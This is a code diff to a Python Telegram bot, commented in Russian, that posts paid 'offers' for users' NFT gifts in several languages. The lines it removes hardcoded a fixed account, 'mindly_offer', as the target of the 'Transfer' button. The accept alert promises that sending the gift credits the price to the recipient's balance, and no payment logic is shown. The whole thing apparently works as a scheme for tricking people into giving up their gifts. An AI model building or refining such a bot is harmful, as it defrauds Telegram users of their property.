@@ -45,9 +45,6 @@ TON_WALLET = os.getenv("TON_WALLET", "UQ_ТВОЙ_АДРЕС_TON")
 ENTRY_PRICE = os.getenv("ENTRY_PRICE", "5.5")
 USERS_FILE = os.getenv("USERS_FILE", "allowed_users.json")
 
-# ===== Кому отправлять подарок (НФТ) при нажатии "Передать" =====
-GIFT_RECIPIENT = "mindly_offer" 
-
 router = Router()
 COMMAND_REGEX = re.compile(r"^купить\s+(.*)$", re.IGNORECASE)
 GIFT_EMOJI_HTML = '<tg-emoji emoji-id="6032937473162614352">🎁</tg-emoji>'
@@ -137,7 +134,7 @@ class Offer:
     currency: str
     lang: str = "ru"
     buyer_username: str = ""
-    gift_link: str = "подарок"  # Ссылка на подарок
+    gift_link: str = "подарок"
 
 
 offers: dict[str, Offer] = {}
@@ -172,7 +169,6 @@ async def safe_send_message_text(
 
 async def safe_edit_message_text(
     bot: Bot, text: str, chat_id: int, message_id: int,
-    business_connection_id: str | None = None,
     reply_markup: InlineKeyboardMarkup | None = None,
     link_preview_options: LinkPreviewOptions | None = None
 ) -> None:
@@ -181,9 +177,9 @@ async def safe_edit_message_text(
     max_retries = 3
     for attempt in range(max_retries):
         try:
+            # ВАЖНО: Метод edit_message_text НЕ принимает business_connection_id
             await bot.edit_message_text(
                 text=text, chat_id=chat_id, message_id=message_id,
-                business_connection_id=business_connection_id,
                 reply_markup=reply_markup, link_preview_options=link_preview_options
             )
             return
@@ -196,7 +192,7 @@ async def safe_edit_message_text(
             logging.info(f"Edit FLOOD_WAIT ({wait_time}s).")
             await asyncio.sleep(wait_time)
         except Exception as e:
-            logging.debug(f"Edit failed: {e}")
+            logging.error(f"Edit failed: {e}")
             if attempt == max_retries - 1:
                 raise
             await asyncio.sleep(1)
@@ -222,9 +218,8 @@ def offer_text(offer: Offer) -> str:
     price = offer.price
     cur = offer.currency
     ttl = TTL_HOURS
-    gift = offer.gift_link  # Сюда попадет ссылка или слово "подарок"
+    gift = offer.gift_link
     
-    # Неразрывный пробел (Unicode) для времени, чтобы "м." не съезжала
     nbsp = "\u00A0"
 
     if offer.lang == "en":
@@ -246,7 +241,6 @@ def offer_text(offer: Offer) -> str:
             f"العرض صالح لمدة <b>{ttl}{nbsp}س{nbsp}و{nbsp}59{nbsp}د أخرى.</b>"
         )
 
-    # Русский (по умолчанию)
     return (
         f"Пользователь <b>{html.escape(offer.buyer_name)}</b> предлагает\n"
         f"Вам <b>{price} {cur}</b> за {gift}\n\n"
@@ -292,8 +286,8 @@ def sold_keyboard(offer: Offer) -> InlineKeyboardMarkup:
         "ar": "إرسال",
     }.get(offer.lang, "Передать")
     
-    # Отправляем на GIFT_RECIPIENT (mindly_offer)
-    recipient = GIFT_RECIPIENT if GIFT_RECIPIENT else offer.buyer_username
+    # Кнопка передать открывает чат того, кто отправил оффер (покупателя)
+    recipient = offer.buyer_username
     
     return InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text=transfer_label, url=f"tg://send_gift?to={recipient}")],
@@ -319,7 +313,6 @@ def accept_alert_text(offer: Offer) -> str:
     currency = offer.currency
     currency_text_ru = "звезд" if currency == "Stars" else currency
 
-    # Пытаемся извлечь красивое имя подарка из ссылки
     gift_name = offer.gift_link
     if "t.me/" in gift_name or "http" in gift_name:
         parts = gift_name.split("/")
@@ -344,8 +337,6 @@ def accept_alert_text(offer: Offer) -> str:
             f"قم بتحويل الهدية إلى {buyer_handle} لإضافة {offer.price} {currency} إلى رصيدك."
         )
     
-    # ===== ИСПРАВЛЕНИЕ ГРАММАТИКИ ДЛЯ РУССКОГО ЯЗЫКА =====
-    # Если ссылки не было, gift_name равно "подарок". Меняем на "подарка" (родительный падеж).
     if not gift_name or gift_name == "подарок":
         display_gift = "подарка"
     else:
@@ -575,14 +566,12 @@ async def create_offer(message: Message, bot: Bot) -> None:
         await message.answer("Укажите цену! Пример: купить 100 (или купить 100 eng)", quote=False)
         return
 
-    # Ищем ссылку в команде (начинается с http или t.me)
     gift_link = "подарок"
     for word in payload.split():
         if word.startswith(("http://", "https://", "t.me/")):
             gift_link = word
             break
 
-    # Валюта (gram, TON, Stars)
     payload_lower = payload.lower()
     if "gram" in payload_lower or "грам" in payload_lower:
         currency = "gram"
@@ -592,7 +581,6 @@ async def create_offer(message: Message, bot: Bot) -> None:
         currency = "Stars"
 
     try:
-        # Покупатель — тот, кто пишет команду
         buyer = message.from_user
         if not buyer:
             return
@@ -604,7 +592,6 @@ async def create_offer(message: Message, bot: Bot) -> None:
             else (buyer.full_name if hasattr(buyer, "full_name") else f"id{buyer.id}")
         )
 
-        # Проверка доступа
         if buyer_id != ADMIN_ID and buyer_id not in allowed_users:
             await message.answer(
                 "⛔ У вас нет доступа к офферам.\n"
@@ -669,22 +656,22 @@ async def resolve_offer(callback: CallbackQuery, bot: Bot) -> None:
         return
 
     if action == "decline":
+        # Убрали business_connection_id из вызова
         await safe_edit_message_text(
             bot, decline_text(offer), offer.chat_id, offer.message_id,
-            offer.connection_id, None
+            reply_markup=None
         )
         offers.pop(offer_id, None)
         await callback.answer("Отклонено.")
     else:
-        # 1. Меняем сообщение в чате (тут появляется кнопка "Передать")
+        # Убрали business_connection_id из вызова
         text = sold_text(offer)
         await safe_edit_message_text(
             bot, text, offer.chat_id, offer.message_id,
-            offer.connection_id, sold_keyboard(offer)
+            reply_markup=sold_keyboard(offer)
         )
         offers.pop(offer_id, None)
         
-        # 2. Показываем всплывающее окно с предупреждением
         alert_text = accept_alert_text(offer)
         await callback.answer(alert_text, show_alert=True)
 
